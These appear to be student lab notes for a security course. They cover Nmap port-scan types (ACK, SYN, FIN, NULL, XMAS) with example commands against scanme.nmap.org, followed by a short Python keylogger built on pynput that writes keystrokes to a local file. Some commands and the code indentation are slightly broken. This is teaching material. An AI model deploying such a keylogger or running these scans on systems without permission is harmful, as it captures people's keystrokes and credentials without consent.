prac: Using Nmap scanner to perform port scanning of various forms – ACK, SYN, FIN, 
NULL, XMAS. 
NOTE: Install Nmap for windows and install it. After that open cmd and type “nmap” to check if it 
is installed properly. Now type the below commands. 
 
 
• ACK -sA (TCP ACK scan) 
It never determines open (or even open|filtered) ports. It is used to map out firewall rulesets, 
determining whether they are stateful or not and which ports are filtered.
Command: nmap -sA -T4 scanme.nmap.org 

SYN (Stealth) Scan (-sS) 
SYN scan is the default and most popular scan option for good reason. It can be performed 
quickly, scanning thousands of ports per second on a fast network not hampered by intrusive 
firewalls. 
Command: nmap -p22,113,139 scanme.nmap.org 

FIN Scan (-sF) 
Sets just the TCP FIN bit. 
Command: nmap -sF -T4 para 

NULL Scan (-sN) 
Does not set any bits (TCP flag header is 0) 
Command: nmap –sN –p 22 scanme.nmap.org 

XMAS Scan (-sX) 
Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. 
Command: nmap -sX -T4 scanme.nmap.org

Aim: - Create a simple keylogger using python 
Code: - 
from pynput.keyboard import Key, Listener 
import logging 
# if no name it gets into an empty string 
log_dir = "" 
# This is a basic logging function 
logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, 
format='%(asctime)s:%(message)s:') 
# This is from the library 
def on_press(key): 
logging.info(str(key)) 
# This says, listener is on 
with Listener(on_press=on_press) as listener: 
listener.join()
